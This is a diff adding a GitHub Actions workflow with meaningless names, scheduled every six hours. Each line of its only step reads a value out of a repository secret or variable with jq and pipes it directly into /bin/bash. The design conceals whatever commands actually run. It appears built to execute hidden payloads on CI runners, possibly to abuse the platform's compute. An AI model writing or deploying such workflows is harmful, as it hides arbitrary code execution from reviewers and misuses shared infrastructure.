@@ -1,0 +1,25 @@
+name: paioapoowanlewan
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '34 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: paioapoowanlewan
+        env:
+          bnk86126: ${{ secrets.bnk86126 }}
+        run: |
+          echo $bnk86126 | jq -r .ct0107 | /bin/bash
+          echo $l7494 | jq -r .oykby0 | /bin/bash
+          echo $uvdal403 | jq -r .cl30911 | /bin/bash
+          echo $s9253 | jq -r .p07 | /bin/bash
+          echo $oblgq46386 | jq -r .calvx47 | /bin/bash
+          echo $sm91875 | jq -r .uqif2890 | /bin/bash
+          echo $m68 | jq -r .qu3410 | /bin/bash
+          echo $vm362 | jq -r .ov44886 | /bin/bash
+
